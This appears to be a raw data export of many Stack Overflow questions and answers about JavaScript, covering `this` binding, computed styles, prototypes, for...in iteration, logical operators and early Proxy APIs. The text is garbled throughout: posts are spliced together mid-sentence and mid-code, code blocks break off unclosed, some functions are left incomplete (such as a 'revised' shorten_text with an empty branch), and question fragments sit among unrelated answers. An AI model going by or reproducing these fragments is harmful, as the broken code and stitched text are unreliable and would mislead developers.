","5445","","<p>The problem is that the <code>onclick</code> event handler gets executed with the <code>this</code> value pointing to the DOM element that triggered the event, so that's why executing <code>this.DivClick</code> fails.</p>

<p>You need to enforce the context, in order to use instance methods within the event handler, for example, you could store a reference to the current instance:</p>

<pre><code>GameField.prototype.InitField = function(fieldNumber) {

","5445","","<p>I have been working on a cross-browser implementation of a ""getStyle"" function, 
my function isn't complete yet but I can help you to solve this specific problem you have with IE.</p>

<p>For the computed <code>backgroundColor</code>, I'm using a hack proposed in <a href=""http://erik.eae.net/archives/2007/07/27/18.54.15/#comment-102297"">this</a> page, it uses the IE specific <a href=""http://msdn.microsoft.com/en-us/library/ms536683%28VS.85%29.aspx""><code>queryCommandValue</code></a> method to get the <a href=""http://msdn.microsoft.com/en-us/library/ms536974%28VS.85%29.aspx""><code>BackColor</code></a> of a selection.</p>

<p>About the implementation you post, I would recommend to check first if the standard <code>getComputedStyle</code> method via the <code>document.defaultView</code> exists, because some browsers like Opera, provide the IE specific <code>currentStyle</code> object for compatibility.</p>

<p>So I've refactored your function and included the <em>IE hack</em>:</p>

<pre><code>function getStyle(elem, name) {
  if (document.defaultView &amp;&amp; document.defaultView.getComputedStyle) {
    name = name.replace(/([A-Z])/g, ""-$1"");
    name = name.toLowerCase();
    s = document.defaultView.getComputedStyle(elem, """");
    return s &amp;&amp; s.getPropertyValue(name);
  } else if (elem.currentStyle) {
    if (/backgroundcolor/i.test(name)) {
      return (function (el) { // get a rgb based color on IE
        var oRG=document.body.createTextRange();
        oRG.moveToElementText(el);
        var iClr=oRG.queryCommandValue(""BackColor"");
          return ""rgb(""+(iClr &amp; 0xFF)+"",""+((iClr &amp; 0xFF00)&gt;&gt;8)+"",""+
                      ((iClr &amp; 0xFF0000)&gt;&gt;16)+"")"";
      })(elem);
    }

    return elem.currentStyle[name];
  } else if (elem.style[name]) {
    return elem.style[name];
  } else  {
    return null;
  }
}

<p>This works, but it seems the following would do the same:</p>

","5445","","<p>Yes, they do the same thing, both traverse up the prototype chain looking for an specific object in it.</p>

<p>The difference between both is <em>what they are</em>, and how you use them, e.g. the <a href=""http://bclary.com/2004/11/07/#a-15.2.4.6""><code>isPrototypeOf</code></a> is <em>a function</em> available on the <code>Object.prototype</code> object, it lets you test if <em>an specific object</em> is in the prototype chain of another, since this method is defined on <code>Object.prototype</code>, it is be available for all objects.</p>

<p><a href=""http://bclary.com/2004/11/07/#a-11.8.6""><code>instanceof</code></a> is <em>an operator</em> and it expects two operands, an object and a <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Creating_New_Objects/Using_a_Constructor_Function"">Constructor function</a>, it will test if the passed function <code>prototype</code> property exists on the chain of the object (via the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Creating_New_Objects/Using_a_Constructor_Function""><code>[[HasInstance]](V)</code></a> internal operation, available only in Function objects).</p>

<p>For example:</p>

<pre><code>function A () {
  this.a = 1;
}
function B () {
  this.b = 2;
}
B.prototype = new A();
B.prototype.constructor = B;

function C () {
  this.c = 3;
}
C.prototype = new B();

var c = new C();

// instanceof expects a constructor function

c instanceof A; // true
c instanceof B; // true
c instanceof C; // true

// isPrototypeOf, can be used on any object

B.prototype.isPrototypeOf(c); // true

","5445","","<p>That's not an array, they are simple objects, that's why you cannot use the <code>length</code> property.</p>

<p>You need to use the <a href=""https://developer.mozilla.org/En/Core_JavaScript_1.5_Reference/Statements/For...in""><code>for...in</code></a> statement:</p>

<pre><code>for(var x in map_data) { 
  if (map_data.hasOwnProperty(x))

<p>The <code>hasOwnProperty</code> checks are because this statement iterates over all properties, inherited or not, and if something (like some JavaScript frameworks) augmented the <code>Array.prototype</code> or <code>Object.prototype</code> objects, those augmented properties will be also iterated.</p>

<p>You should know that this statement doesn't ensure anyhow the order of iteration.</p>

 [{""name"":""aa""},{""name"":""bb""}],

  }, 500);
});

<p>The main difference between this solution and solutions from other answers is that <em>all</em> the timer logic is handled by the <code>typewatch</code> function itself, the event handler doesn't need to know anything about the timer, it just invokes the function. Also, there are no global variables to take care (the timer id is <em>not</em> stored on a global variable).</p>

<p>The content of an inline event handler becomes the <code>FunctionBody</code> of a function that the browser calls when it fires that event.</p>

<p>The scope chain of this function is <em>augmeted</em> with the element, the element's <code>FORM</code> (if it exits and is a <code>FORM</code> element), and <code>document</code> itself.</p>

<p>It looks something like this in code:</p>

<pre><code>function onclick(event) {
  with(document) {
    with(this.form) {
      with(this) {
        // inline event handler content...
      }
    }
  }
}
</code></pre>

<p>This behavior can cause all sort of <em>name conflicts</em> due the augmentation of the scope chain you cannot be 100% sure about what you are referring, it could be an attribute of the element itself, an attribute of the element's form, an attribute of the <code>document</code> object or any global variable.</p>

"<p>New to JQuery and was wondering how can I put the following JQuery code in an if statement so that it only runs when the submit button is clicked and does nothing when not clicked I know I'm using the <code>$("".save-button"").click(function()</code> is there a way to put it in an if statement?</p>

","5445","","<p>Well, you can check the <code>type</code> attribute of the clicked element e.g.:</p>

<pre><code>//...
if ($(this).attr('type') == 'submit')
//...

<p>But I would recommend you to use the<code>submit</code> event, remember that the form can be also submitted if the user presses Enter:</p>

<pre><code>$(function() {
    $(""#contact-form"").submit(function() {
        var $form = $(this);
        $.post($form.attr(""action""), $form.serialize(), function(html) {

","5445","","<p>Your example is not working because you are not stopping the keystroke, you set the focus on the first element, and then the tab key is sent, which causes the focus to be changed to the second element.</p>

","5445","","<p>JavaScript allows this, you can pass any arbitrary number of arguments to a function.</p>

<p>They are accessible in the <a href=""https://developer.mozilla.org/En/Core_JavaScript_1.5_Reference/Functions_and_function_scope/Arguments""><code>arguments</code></a> object which is an array-like object that has numeric properties containing the values of the arguments that were used when the function was invoked, a <code>length</code> property that tells you how many arguments have been used on the invocation also, and a <code>callee</code> property which is a reference to the function itself, for example you could write:</p>

<pre><code>function sum(/*arg1, arg2, ... , argN  */) { // no arguments defined
  var i, result = 0;
  for (i = 0; i &lt; arguments.length; i++) {
    result += arguments[i];
  }
  return result;
}
sum(1, 2, 3, 4); // 10
</code></pre>

<p>The <code>arguments</code> object may look like an array, but it is a plain object, that inherits from <code>Object.prototype</code>, but if you want to use Array methods on it, you can invoke them directly from the <code>Array.prototype</code>, for example, a common pattern to get a <em>real array</em> is to use the Array <code>slice</code> method:</p>

<pre><code>function test () {
  var args = Array.prototype.slice.call(arguments);
  return args.join("" "");
}
test(""hello"", ""world""); // ""hello world""
</code></pre>

<p>Also, you can know how many arguments a function <em>expects</em>, using the <code>length</code> property of the function object:</p>

<pre><code>function test (one, two, three) {
  // ...
}
test.length; // 3

<p>And it will return the value of the <em>first operand</em> if it is by itself <em>falsy</em>:</p>

<pre><code>NaN &amp;&amp; ""anything""; // NaN
0 &amp;&amp; ""anything"";   // 0

<p>The <strong>Logical OR</strong> operator (<code>||</code>) will return the value of the second operand, if the first one is <em>falsy</em>:</p>

"<p>I am making a simple accordion menu in javascript. I'd like to be able to set the compact and expanded heights for the elements via the css max-height and min-height values. For some reason, when I try to retrieve the min-height and max-height of the elements in javascript for animation purposes, I get an empty string rather than, for instance, ""500px"" like it should. The max-height value is set in css, e.g.
<code>#id {

<code>alert( item.style.minHeight );</code>
it pops up an empty alert box. This happens in Firefox 3.6.2 and IE 8. Does anybody know why javascript refuses to be able to get an element's minHeight and maxHeight?</p>
","5445","","<p>The <a href=""https://developer.mozilla.org/En/DOM/element.style""><code>element.style</code></a> property lets you know only the CSS properties that were defined as <em>inline</em> in that element, you should get the <em>computed style</em>, is not so easy to do it in a cross-browser way, as others said, IE has its own way, through the <code>element.currentStyle</code> property, the DOM Level 2 <em>standard</em> way, implemented by other browsers is the <a href=""http://www.w3.org/TR/DOM-Level-2-Style/css.html#CSS-CSSview-getComputedStyle""><code>document.defaultView.getComputedStyle</code></a> method.</p>

<p>However there are differences between the IE way and the standard way, for example, the IE <a href=""http://msdn.microsoft.com/en-us/library/ms535231%28VS.85%29.aspx""><code>element.currentStyle</code></a> property expect that you access the CCS property names composed of two or more words in <em>camelCase</em> (e.g. <code>maxHeight</code>, <code>fontSize</code>, <code>backgroundColor</code>, etc), the standard way expects the properties with the words separated with dashes (e.g. <code>max-height</code>, <code>font-size</code>, <code>background-color</code>, etc).</p>

<p>Also, the IE <code>element.currentStyle</code> will return all the sizes in the unit that they were specified, (e.g. 12pt, 50%, 5em), the standard way will compute the actual size in pixels.</p>

<p>I made some time ago a cross-browser function that allows you to get the computed styles in a cross-browser way:</p>

<pre><code>function getStyle(el, styleProp) {
  var value, defaultView = (el.ownerDocument || document).defaultView;
  // W3C standard way:
  if (defaultView &amp;&amp; defaultView.getComputedStyle) {
    // sanitize property name to css notation
    // (hypen separated words eg. font-Size)
    styleProp = styleProp.replace(/([A-Z])/g, ""-$1"").toLowerCase();
    return defaultView.getComputedStyle(el, null).getPropertyValue(styleProp);
  } else if (el.currentStyle) { // IE
    // sanitize property name to camelCase
    styleProp = styleProp.replace(/\-(\w)/g, function(str, letter) {
      return letter.toUpperCase();
    });
    value = el.currentStyle[styleProp];
    // convert other units to pixels on IE
    if (/^\d+(em|pt|%|ex)?$/i.test(value)) { 
      return (function(value) {
        var oldLeft = el.style.left, oldRsLeft = el.runtimeStyle.left;
        el.runtimeStyle.left = el.currentStyle.left;
        el.style.left = value || 0;
        value = el.style.pixelLeft + ""px"";
        el.style.left = oldLeft;
        el.runtimeStyle.left = oldRsLeft;
        return value;
      })(value);
    }
    return value;
  }
}

<p>revised code based on comments below for anyone who is googling for such function:</p>

<pre><code>function shorten_text(str, size){
    size = parseInt(size);
    var endValue = Math.floor(size / 10);
    if( str.length &gt; endValue ) {

    }else{
        return str;
    }
}

<p>SCREEN SHOT:</p>

<p><img src=""http://www.freeimagehosting.net/uploads/4639663b52.gif"" alt=""screenshot""></p>
","5445","","<p>You need to initialize your <code>newStr</code> variable with an empty string, otherwise that variable will contain the <code>undefined</code> value, which will be converted to string when  you concatenate, e.g.:</p>

<pre><code>var test; // at this moment the variable contains the undefined value
test += 'foo';
// now test contains ""undefinedfoo""
</code></pre>

<p>In your function:</p>

<pre><code>function shorten_text(str, size){
    size = size.match( /[0-9]*/ );
    var endValue = Math.floor( Number(size) / 10 );
    var number;
    var newStr = '';
    for ( number = 0; number &lt;= endValue; number++ ) {
        if( str[number].length != 0 ) {
            newStr += str[number];
        }
    }   
    return newStr + '...';
}

shorten_text('Phil Jackson', '94px'); //  outputs ""Phil Jacks...""
</code></pre>

<p>A few comments:</p>

<ul>
<li>You don't need to call <code>Number(size)</code>, since the division operator makes type coercion. implicitly</li>
<li>You could use the <code>substring</code> method to get a portion of your original string.</li>
<li>Accessing characters of a string with the square bracket property accessor may not be supported by some implementations, you can use the standard <code>charAt</code> method (<code>str.charAt(i)</code>)</li>
</ul>

<p>Another approach to do the same:</p>

<pre><code>function shorten_text(str, size){
    var endValue = Math.floor(parseInt(size) / 10);
    return str.substring(0, endValue) + '...';
}

shorten_text('Phil Jackson', '94px'); //  outputs ""Phil Jack..."" as expected

","5445","","<p>That happens because the <a href=""http://bclary.com/2004/11/07/#a-11.11"" rel=""nofollow"">Boolean Operators</a> in JavaScript can return an operand, and not necessarily a <code>Boolean</code> result, e.g.:</p>

<p>The Logical AND operator (<code>&amp;&amp;</code>), will return the value of the second operand if the first is <em>truthy</em>:</p>

<pre><code>true &amp;&amp; ""foo""; // ""foo""
</code></pre>

<p>And it will return the value of the first operand if it is by itself <em>falsy</em>:</p>

<pre><code>NaN &amp;&amp; ""anything""; // NaN
0 &amp;&amp; ""anything"";   // 0

alert(true &amp;&amp; true &amp;&amp; true &amp;&amp; ""Huh?""); // ""Huh?""

<p>The Logical OR operator (<code>||</code>) has a similar behavior, it will return the value of the second operand, if the first one is <em>falsy</em>:</p>

<pre><code>false || ""bar""; // ""bar""

<p>And it will return the value of the first operand if it is by itself non-falsy:</p>

","5445","","<p>Speaking about the global context, both, the <code>var</code> statement and a <code>FunctionDeclaration</code> at the end will create a <em>non-deleteable</em> property on the global object, but the value of both <em>can be overwritten</em>.</p>

<p>The subtle difference between the two ways is that when the <a href=""http://bclary.com/2004/11/07/#a-10.1.3"">Variable Instantiation</a> process runs (before the actual code execution) all identifiers declared with <code>var</code> will be initialized with <code>undefined</code>, and the ones used by the <code>FunctionDeclaration</code>'s will be available since that moment, for example:</p>

<pre><code> alert(typeof foo); // 'function', it's already available
 alert(typeof bar); // 'undefined'
 function foo () {}
 var bar = function () {};
 alert(typeof bar); // 'function'
</code></pre>

<p>The assignment of the <code>bar</code> <code>FunctionExpression</code> takes place until runtime.</p>

<p>A global property created by a <code>FunctionDeclaration</code> can be overwritten without any problems just like a variable value, e.g.:</p>

<pre><code> function test () {}
 test = null;
</code></pre>

<p>Another obvious difference between your two examples is that the first function doesn't have a name, but the second has it, which can be really useful when debugging (i.e. inspecting a call stack).</p>

<p>About your edited first example (<code>foo = function() { alert('hello!'); };</code>), it is an undeclared assignment, I would highly encourage you to always use the <code>var</code> keyword.</p>

<p>With an assignment, without the <code>var</code> statement, if the referenced identifier is not found in the scope chain, it will become a <em>deleteable</em> property of the global object.</p>

<p>Also, undeclared assignments throw a <code>ReferenceError</code> on ECMAScript 5 under <a href=""http://dmitrysoshnikov.com/ecmascript/es5-chapter-2-strict-mode/"">Strict Mode</a>.</p>

<ul>
<li><a href=""http://wiki.ecmascript.org/doku.php?id=harmony%3aproxies"">ECMAScript Harmony Proxies</a>.</li>
</ul>

<p>There are only <em>two working</em> implementations available at this time, in the latest Firefox 4 betas (it has been around since FF3.7 pre-releases) and in <a href=""https://npmjs.org/package/node-proxy"">node-proxy</a> for server-side JavaScript -<a href=""http://code.google.com/p/v8/issues/detail?id=633"">Chrome</a> and <a href=""https://bugs.webkit.org/show_bug.cgi?id=35731"">Safari</a> are currently working on it-.</p>

<p>It is one of the <a href=""http://wiki.ecmascript.org/doku.php?id=harmony%3aproposals&amp;s=harmony"">early proposals</a> for the <a href=""http://en.wikipedia.org/wiki/ECMAScript#ECMAScript_Harmony"">next version of ECMAScript</a>, it's an API that allows you to implement <em>virtualized</em> objects (proxies), where you can assign a variety of <em>traps</em> -callbacks- that are executed in different situations, you gain full control on what at this time -in ECMAScript 3/5- only host objects could do.</p>

<p>To build a proxy object, you have to use the <code>Proxy.create</code> method, since you are interested in the <code>set</code> and <code>get</code> traps, I leave you a really simple example:</p>

<pre><code>var p = Proxy.create({
  get: function(proxy, name) {        // intercepts property access
    return 'Hello, '+ name;
  },
  set: function(proxy, name, value) { // intercepts property assignments
    alert(name +'='+ value);
    return true;
  }
});

alert(p.world); // alerts 'Hello, world'
p.foo = 'bar';  // alerts foo=bar
</code></pre>

<p>Try it out <a href=""http://jsbin.com/ucupe4/edit"">here</a>.</p>

<p>The Proxy API is so new that isn't even documented on the Mozilla Developer Center, but as I said, a working implementation has been included since the Firefox 3.7 pre-releases.</p>

<p>The <code>Proxy</code> object is available in the global scope and the <code>create</code> method can take two arguments, a <code>handler</code> object, which is simply an object that contains properties named as the traps you want to implement, and an optional <code>proto</code> argument, that makes you able to specify an object that your proxy inherits from.</p>

<p>The traps available are:</p>

<pre><code>// TrapName(args)                          Triggered by
// Fundamental traps
getOwnPropertyDescriptor(name):           // Object.getOwnPropertyDescriptor(proxy, name)
getPropertyDescriptor(name):              // Object.getPropertyDescriptor(proxy, name) [currently inexistent in ES5]

"<p>I am trying to create a UserDon object, and trying to generate the get and set methods programmatically ( based on Pro Javascript book by John Resig page 37 ), and am testing this on Firefox 3.5</p>

<p>The problem is: in function UserDon, ""this"" refers to the window object instead of the UserDon object. </p>

<p>So after calling var userdon = new UserDon(...) I got setname and getname methods created on the window object (also setage and getage).</p>

<p>How can I fix this?</p>

<pre><code>function UserDon( properties ) {
   for( var i in properties ) {
   (function(){
      this[ ""get"" + i ] = function() {
        return properties[i];
      };

      this[ ""set"" + i ] = function(val) {
        properties[i] = val;
      };
      })();
   }
 }

var userdon = new UserDon( {
   name: ""Bob"",
   age: 44
});
</code></pre>
","5445","","<p>The <code>this</code> value you are using belongs to the auto-invoking function expression you have inside the loop, and when you invoke a function in this way, <code>this</code> will <em>always</em> refer to the global object.</p>

<p><strong>Edit:</strong> I missed the fact that the function expression is <em>trying</em> to make variable capturing to handle the getter/setter creation inside the loop, but the looping variable <code>i</code>, needs to be passed as an argument in order to do it and since the function expression is there, context (the outer <code>this</code>) should be preserved:</p>

<pre><code>function UserDon( properties ) {
  var instance = this; // &lt;-- store reference to instance

  for( var i in properties ) { 
    (function (i) { // &lt;-- capture looping variable
      instance[ ""get"" + i ] = function() {
        return properties[i];
      };

      instance[ ""set"" + i ] = function(val) {
        properties[i] = val;
      };
    })(i); // &lt;-- pass the variable
  }
}

var userdon = new UserDon( {
   name: ""Bob"",
   age: 44
});

userdon.getname(); // ""Bob""
userdon.getage();  // 44
</code></pre>

<p>You can also use the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/call"" rel=""nofollow""><code>call</code></a> method to invoke the function expression, preserving the context (the value of <code>this</code>) and introducing the looping variable to the new scope in a single step:</p>

<pre><code>function UserDon( properties ) {
  for( var i in properties ) { 
    (function (i) { // &lt;-- looping variable introduced
      this[ ""get"" + i ] = function() {
        return properties[i];
      };

      this[ ""set"" + i ] = function(val) {
        properties[i] = val;
      };
    }).call(this, i); // &lt;-- preserve context and capture variable
  }
}
</code></pre>

<p>I would also recommend to use an <code>if (properties.hasOwnProperty(i)) { ... }</code> inside the <code>for...in</code> loop to avoid iterating over user extended properties inherited from <code>Object.prototype</code>.</p>

"<p>I ran into an interesting issue the other day and was wondering if someone could shed light on why this is happening. Here is what I am doing (for the purposes of this example I have dumbed down the example somewhat):</p>

<ul>
<li>I am creating a globally scoped variable using the square bracket notation and assigning it a value.</li>
<li><p>Later I declare a var with the same name as the one I just created above. Note I am not assigning a value. Since this is a redeclaration of the same variable the old value should not be overriden as described here: <a href=""http://www.w3schools.com/js/js_variables.asp"" rel=""nofollow"">http://www.w3schools.com/js/js_variables.asp</a></p>

<pre><code>//create global variable with square bracket notation
window['y'] = 'old';


//redeclaration of the same variable
var y;


if (!y) y = 'new';


alert(y); //shows New instead of Old
</code></pre></li>
<li><p>The problem is that the old value actually does get overriden and in the above eg. the alert shows 'new' instead of 'old'. Why ?</p></li>
</ul>

<p>I guess another way to state my question is how is the above code different in terms of semantics from the code below:</p>

<pre><code>//create global variable 
var y = 'old';

//redeclaration of the same variable
var y;

if (!y) y = 'new';

alert(y); //shows Old
</code></pre>

<p><strike><strong>Update 1</strong> : Based on the some of the comments and answers I am rephrasing the example to be more reflective of my original problem. </p>

<p>Create 2 javascript files with the following content :
Script1</p>

<pre><code>//create global variable with square bracket notation
window['y'] = 'old';
</code></pre>

<p>Script2</p>

<pre><code>//redeclaration of the same variable
var y;

if (!y) y = 'new';

alert(y); //shows New instead of Old in IE
</code></pre>

<p>Include these 2 files in your html file</p>

<pre><code>&lt;html&gt;
 &lt;head&gt;&lt;/head&gt;
 &lt;body&gt;

  &lt;script type=""text/javascript"" src=""my.js""&gt;&lt;/script&gt;
  &lt;script type=""text/javascript"" src=""my2.js""&gt;&lt;/script&gt;

 &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p><strong>Opening this page in Firefox and Chrome alerts 'old' which is the expected behavior. However in IE 8 the page will actually alert 'new'</strong> </strike></p>

<p>The <a href=""http://bclary.com/2004/11/07/#a-15.3.3.1"" rel=""nofollow""><code>Function.prototype</code></a> doesn't have a <code>valueOf</code> method, it is inherited from <a href=""http://bclary.com/2004/11/07/#a-15.2.4.4"" rel=""nofollow""><code>Object.prototype</code></a> and this method will simply return the same function object where you call it:</p>

<pre><code>Function.valueOf() === Function; // true
</code></pre>

<p>I think you are confusing it with the toString method (or you are alerting the valueOf method call which causes on most browsers an implicit ToString conversion).</p>

<p>However, you can use the <code>toString</code> method directly on function objects, and <em>in almost</em> all implementations, will return you a string representation containing <code>""[native code]""</code> in its function body, I wouldn't recommend it too much because, the <code>Function.prototype.toString</code> method is implementation dependent...</p>

<pre><code>function isNative(fn) {
  return /native code/.test(fn.toString);
}

isNative(Function); // true
isNative(function () {}); // false

<p>It works. But when I execute my page, even without using this function, Firebug tells me that jQuery's <code>.appendTo()</code> is no longer a function. Why would this be?</p>
","5445","","<p>That prototype extension is breaking the <a href=""http://github.com/jquery/jquery/blob/1.4.2/src/core.js#L533""><code>$.each</code></a> method, because this method detects between arrays and objects using the <code>length</code> property (in <a href=""http://github.com/jquery/jquery/tree/1.4.2"">jQuery 1.4.2</a>):</p>

<pre><code>// core.js Line 533
each: function( object, callback, args ) {
    var name, i = 0,
        length = object.length, // &lt;--- your function from Object.prototype
        isObj = length === undefined || jQuery.isFunction(object);
//...
</code></pre>

<p>As you can see, the <code>isObj</code> variable will be true only if it doesn't contains a <code>length</code> property (or the property value is <code>undefined</code>).</p>

<p>If <code>isObj</code> is false, jQuery will try to iterate using a normal <code>for</code> loop:</p>

<pre><code>for ( var value = object[0];
    i &lt; length &amp;&amp; callback.call( value, i, value ) !== false; value = object[++i] ) {}
</code></pre>

<p>Then, the <code>appendTo</code> method is created using <code>$.each</code>, that's why is not defined:</p>

<pre><code>//...
jQuery.each({
    appendTo: ""append"",
    prependTo: ""prepend"",
    insertBefore: ""before"",
    insertAfter: ""after"",
    replaceAll: ""replaceWith""
},
//...
</code></pre>

<p>I will <strong>always recommend</strong> to stay away from extending <code>Object.prototype</code>, when you extend this prototype <strong>ALL</strong> objects receive those additional properties. </p>

<p>This is especially problematic since when you iterate over the properties of the object
these new properties appear, causing all sorts of unexpected behavior.</p>

<p>Is not so easy to do it in a cross-browser way, IE has its own way, through the <code>element.currentStyle</code> property, and  the DOM Level 2 <em>standard</em> way, implemented by other browsers is through the <a href=""http://www.w3.org/TR/DOM-Level-2-Style/css.html#CSS-CSSview-getComputedStyle""><code>document.defaultView.getComputedStyle</code></a> method.</p>

"<p>I was just looking at the jQueryUI button plug-in and noticed this</p>

<pre><code>$(""button, input:submit, a"", "".demo"").button();
</code></pre>

<p>I never seen something like this. Is this like multiple selects in one jQuery selector?</p>
","5445","","<p>The second argument (<code>"".demo""</code> in your example) is the <em>context</em>, basically your selector is restricted to match only descendants of a determined <em>context</em>:</p>

<pre><code>$(expr, context)
</code></pre>

<p>Is just equivalent to use the <a href=""http://api.jquery.com/find/""><code>find</code></a> method:</p>

<pre><code>$(context).find(expr)
</code></pre>

<p>Give a look to the documentation of the <a href=""http://api.jquery.com/jQuery/#jQuery1"">jQuery function</a>:</p>

<blockquote>
  <p>Selector Context</p>
  
  <p>By default, selectors perform their
  searches within the DOM starting at
  the document root. However, an
  alternate context can be given for the
  search by using the optional second
  parameter to the <code>$()</code> function. For
  example, if within a callback function
  we wish to do a search for an element,
  we can restrict that search:</p>
</blockquote>

<pre><code>$('div.foo').click(function() {
  $('span', this).addClass('bar');
  // it will find span elements that are
  // descendants of the clicked element (this)
});
</code></pre>

<p>Also notice that the selector you post <code>""button, input:submit, a""</code>, is called <a href=""http://api.jquery.com/multiple-selector/"">Multiple Selector</a>, and there you can specify any number of selectors to combine into a single result, just by separating them by a comma.</p>

"<p>Assuming I declare </p>

<pre><code>var ad = {}; 
</code></pre>

<p>How can I check whether this object will contain any user-defined properties?</p>
","5445","","<p>What about making a simple function?</p>

<pre><code>function isEmptyObject(obj) {
  for(var prop in obj) {
    if (Object.prototype.hasOwnProperty.call(obj, prop)) {
      return false;
    }
  }
  return true;
}

isEmptyObject({}); // true
isEmptyObject({foo:'bar'});  // false
</code></pre>

<p>The <code>hasOwnProperty</code> method call directly on the <code>Object.prototype</code> is only to add little more <em>safety</em>, imagine the following using a normal <code>obj.hasOwnProperty(...)</code> call:</p>

<pre><code>isEmptyObject({hasOwnProperty:'boom'});  // false
</code></pre>

<hr>

<p><strong>Note:</strong> <sub>(for the future)</sub>  The above method relies on the <code>for...in</code> statement, and this statement iterates only over <em>enumerable</em> properties, in the currently most widely implemented ECMAScript Standard (3rd edition) the programmer doesn't have any way to create non-enumerable properties.</p>

<p>However this has changed now with <a href=""http://www.ecma-international.org/publications/standards/Ecma-262.htm"">ECMAScript 5th Edition</a>, and we are able to create non-enumerable, non-writable or non-deletable properties, so the above method <strong>can fail</strong>, e.g.:</p>

<pre><code>var obj = {};
Object.defineProperty(obj, 'test', { value: 'testVal', 
  enumerable: false,
  writable: true,
  configurable: true
});
isEmptyObject(obj); // true, wrong!!
obj.hasOwnProperty('test'); // true, the property exist!!
</code></pre>

<p>An ECMAScript 5 solution to this problem would be:</p>

<pre><code>function isEmptyObject(obj) {
  return Object.getOwnPropertyNames(obj).length === 0;
}
</code></pre>

<p>The <code>Object.getOwnPropertyNames</code> method returns an <code>Array</code> containing the names of <em>all</em> the <em>own properties</em> of an object, <em>enumerable or not</em>, this method is being implemented now by browser vendors, it's already on the Chrome 5 Beta and the latest WebKit Nightly Builds.</p>

<p><code>Object.defineProperty</code> is also available on those browsers and latest Firefox 3.7 Alpha releases.</p>

","5445","","<p>Well, there is actually a way to get the <em>current</em> <code>script</code>, e.g.:</p>

<p>The above works because at the moment when the <code>script</code> element is being executed, is the last <code>script</code> element of the DOM (<code>scripts[scripts.length - 1]</code>).</p>

","5445","","<p>Well, it will work, the problem with JScript (IE), is that the identifier of the function expression (<code>executeOnLoad</code>) will leak to its enclosing scope, and actually creating <em>two</em> function objects..</p>

<pre><code>(function () {

  alert(typeof foo); // ""undefined"" on all browsers, ""function"" on IE

"<p>I'm having some trouble understanding the IF clause at the end of this function from Pro JavaScript Design Patterns:</p>

<pre><code>function extend(subClass, superClass) {
    var F = function() {};
    F.prototype = superClass.prototype;
    subClass.prototype = new F();
    subClass.prototype.constructor = subClass;

    subClass.superclass = superClass.prototype;
    if(superClass.prototype.constructor == Object.prototype.constructor) {
        superClass.prototype.constructor = superClass;
    }
}
</code></pre>

<p>The book explains that these lines ensure that the superclass's constructor attribute is correctly set, even if the superclass is the Object class itself.  Yet, if I omit those three lines and do the following:</p>

<pre><code>function SubClass() {};
extend(SubClass, Object);

alert(Object.prototype.constructor == Object);
</code></pre>

<p>The alert says 'true', which means the superclass's constructor is set correctly even without those last three lines.  Under what conditions, then, does this IF statement do something useful?</p>

<p>Thanks.</p>
","5445","","<p>The problem that those two lines try to avoid, is generally produced when you replace the <code>prototype</code> property of a Constructor Function, for example:</p>

<pre><code>function Foo () {};
Foo.prototype = {
  bar: 'baz'
};

var foo = new Foo();
foo.constructor === Object; // true, but `constructor` should refer to Foo
</code></pre>

<p>When <a href=""http://bclary.com/2004/11/07/#a-13.2"">functions objects are created</a>, the <code>prototype</code> property is initialized with a new object, which contains a <code>constructor</code> property that refers to the function itself, e.g.:</p>

<pre><code>function Bar () {};
var bar = new Bar();
bar.constructor === Bar; // true
</code></pre>

<p>When you replace the <code>prototype</code> property with another object, this object has it's own <code>constructor</code> property, generally inherited from other constructor, or from <code>Object.prototype</code>.</p>

newObj.constructor === Object;

<p>The purpose of the <code>for...in</code> statement is to <em>enumerate object properties</em>.</p>

<p>I think that the <code>for...in</code> statement should be avoided to traverse any array-like<sup>1</sup> object, where the real purpose is <strong>iterate</strong> over numeric indexes and not <strong>enumerate</strong> the object properties (even knowing that those indexes are properties).</p>

<p>Reasons to avoid <code>for...in</code> to iterate array-like objects:</p>

<li>Iterates over <em>inherited user-defined properties</em> in addition to the array elements, if you use a library like MooTools for example, which extend the <code>Array.prototype</code> object, you will see all those extended properties.</li>
<li>The order of iteration is arbitrary, the elements may not be visited in numeric order.</li>

<p>1) what is happening behind the assignment? var fx = john.greet;
   is this copy by value or copy by reference?
   fx and john.greet point to two diferent function, right?</p>

<p>2) since fx is a global method, the scope chain contains only global object. what is the value of <strong><em>this</em></strong> property in Variable object? </p>
","5445","","<p>1) <code>fx</code> and <code>john.greet</code> are referring to the same function object, the assignment operation for objects, works <em>by reference</em>.</p>

<p>For primitive values, like <code>String</code>, <code>Number</code>, <code>Boolean</code> <code>undefined</code> or <code>null</code>, a copy of the value will be made.</p>

<p>2) The <code>this</code> value refers to the global object.</p>

<p>The <code>this</code> value is not a property of the <a href=""http://bclary.com/2004/11/07/#a-10.1.3"" rel=""nofollow"">Variable Object</a> and it has nothing to do with the <em>scope chain</em>, is a special reserved word, and it is determined implicitly when a <a href=""http://bclary.com/2004/11/07/#a-11.2.3"" rel=""nofollow"">function is called</a> (you can also set it explicitly via <code>call</code> or <code>apply</code>).</p>

<p>JavaScript internally handles a <a href=""http://bclary.com/2004/11/07/#a-8.7"" rel=""nofollow""><code>Reference type</code></a>, which  consists of two components, the <em>base object</em> and the <em>property name</em>, when a function is invoked, the <code>this</code> value is determined implicitly by getting the <em>base object</em> (by the internal <a href=""http://bclary.com/2004/11/07/#a-8.7.1"" rel=""nofollow""><code>GetValue</code></a> operation).</p>

<p>And finally, the last case where <code>this</code> is set implicitly is when you invoke a function with the <a href=""http://bclary.com/2004/11/07/#a-11.2.2"" rel=""nofollow""><code>new</code></a> operator, the <code>this</code> keyword will refer to a newly created object.</p>

<p>So in brief, here is how <code>this</code> works <em>implicitly</em>:</p>

<p>1- When a function is called as a method (the function is invoked as member of an object):</p>

<pre><code>obj.method(); // 'this' inside method will refer to obj
</code></pre>

<p>2- A <em>normal</em> function call:</p>

<pre><code>myFunction(); // 'this' inside the function will refer to the Global object
// or

<p>3- When the <code>new</code> operator is used:</p>

<pre><code>var obj = new MyObj(); // 'this' will refer to a newly created object.

<p>It works but only if foo is called as a function like so</p>

<pre><code>foo();

<p>That would allow me to only call it once as a function and after that as a regular variable. But it's still not what I want. Plus it gets complicated if it accidentally gets called as a function again, returning an error.</p>

<p>Is this even possible in JavaScript?</p>

<p>BTW, this is for a Chrome/Firefox extension, so IE compatibility does not matter.</p>

